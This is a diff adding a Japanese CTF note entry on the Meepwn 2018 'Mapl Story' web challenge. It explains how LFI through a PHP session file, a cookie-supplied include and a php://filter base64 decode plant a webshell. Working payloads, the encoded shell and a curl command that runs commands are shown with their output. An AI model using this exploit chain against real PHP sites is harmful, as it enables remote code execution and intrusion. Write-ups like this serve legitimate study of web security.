@@ -74,10 +74,68 @@ https://jaiguptanick.github.io/Blog/blog/SharkyCTF_Writeup_web/
 <root>
     <data>&xxe;</data>
 </root>
-
-## 
+```
+## LFI with /var/lib/php/sessions/sess\_\<PHPSESSID\> / upload base64 webshell "php://filter/convert.base64-decode/resource=" (Meepwn CTF Quals 2018 Mapl Story)
+https://ctftime.org/writeup/10418  
+https://movrment.blogspot.com/2018/07/meepwn-ctf-2018-qual-maple-s.html  
 - **entrypoint**  
+`include($_GET['page'])`で明らかにLFIができるが、GET,POST経由のデータはすべて`(`,`)`,`//`,`` ` ``が削除されている。  
+`?page=/etc/passwd`みたいにはできる。  
+`flag.txt`みたいな感じでフラグはなくて、どっかにあるのでRCEして探す必要があるのが前提。  
+`/var/lib/php/sessions/sess_<PHPSESSID>`にあるセッションファイルにアクセスすると、何らかの暗号化されたデータ的なのがあって、それを使ってCookieにある`hash('sha256','admin'.$salt)`で生成されている文字列の`$salt`を復号するらしい。  
+これを復号してadminとしてログインする。  
+adminは`"uploads/".md5($salt.$email)."/command.txt`に任意の19文字以内の文字を書き込めるらしい。ただし、GET,POST経由では`(`,`)`,`//`,`` ` ``が削除されるので、``<?=`$_GET[1]`;``などの最短のwebshellは設置できない…。  
+`<?=include"$_COOKIE[0]`を書き込めば、COOKIEから値を読みだすので`(`とかは削除されなくなる！！  
+ただし`include`関数ではRCEできないので、`command.txt`に書き込んだBase64エンコードしたWebshellを`sess_<PHPSESSID>`に書き込んだincludeで読み込みたい！  
+つまり、`sess_<PHPSESSID>`に`<?=include"$_COOKIE[0]`を書き込んで、`?page=/var/lib/php/sessions/sess_<PHPSESSID>`でLFIして`include`関数を実行する。  
+その引数はCOOKIE経由で渡し、内容は`php://filter/convert.base64-decode/resource=upload/56cea464131b6903185abfe3d6103385/command.txt'`で`command.txt`には``<?=`$_GET[1]`;``がbase64 encodeされたものが書かれている。  
+```txt
+// ほんとはcommand.txtに<?=`$_GET[1]`;を書き込みたいがそれができないのでbase64エンコードしたものを書き込んでおいてそれをデコードする
+// これだと中身がbase64エンコードされたものをincludeするのでダメ
+include("upload/56cea464131b6903185abfe3d6103385/command.txt")
+
+// これで中身がbase64デコードしてからincludeできる
+include("php://filter/convert.base64-decode/resource=upload/56cea464131b6903185abfe3d6103385/command.txt")
+
+// 以下みたいなことはどうやらできないらしい…。
+include("php://filter/convert.base64-decode/resource=data:text/plain,base64,PD89YCRfR0VUWzFdYDs=")
+// これはdata://がallow_url_includeが0になっており禁止されている。そもそもこれができるならRFIできる
+include("data://text/plain,%3C%3F%3D%60%24_GET%5B1%5D%60%3B)
+```
+したがって、以下のように`ls`コマンドを実行できるらしい。  
+```txt
+Ξ ~ → curl 'http://mapl.story/?page=/var/lib/php/sessions/sess_0qlekg08c8pah3rcftjraeon24&1=ls' -H 'Cookie: 0=php://filter/convert.base64-decode/resource=upload/56cea464131b6903185abfe3d6103385/command.txt'      
+character_name|s:96:"d1f197d11ed6b3d29f08a9893429eb2bfa19e4543ff1d33bf19c5a89aec19b45080a355c37b4654ec2a5813f81dbe98b";user|s:96:"917467323f3a8e09ab1c2a2d7e3dc3ac85c0c4f08622b7e10a4ec4a18ad36e9919326131b516d9053ee8980a1230ad0e";action|s:65:"[02:27:52am GMT+7] gave blackpig to player admin.php
+assets
+character.php
+dbconnect.php
+die.php
+game.php
+home.php
+index.php
+login.php
+logout.php
+mapl_library.php
+register.php
+setting.php
+style.css
+upload
+1
+```
 - **payload**  
+`/var/lib/php/sessions/sess_0qlekg08c8pah3rcftjraeon24`  
+```txt
+<?=include"$_COOKIE[0]
+```
+`upload/56cea464131b6903185abfe3d6103385/command.txt`  
+(``<?=`$_GET[1]`;``のBase64エンコード)  
+```txt
+PD89YCRfR0VUWzFdYDs=
+```
+以下でlsコマンドを実行  
+```txt
+curl 'http://mapl.story/?page=/var/lib/php/sessions/sess_0qlekg08c8pah3rcftjraeon24&1=ls' -H 'Cookie: 0=php://filter/convert.base64-decode/resource=upload/56cea464131b6903185abfe3d6103385/command.txt'   
+```
 ## 
 - **entrypoint**  
 - **payload**  
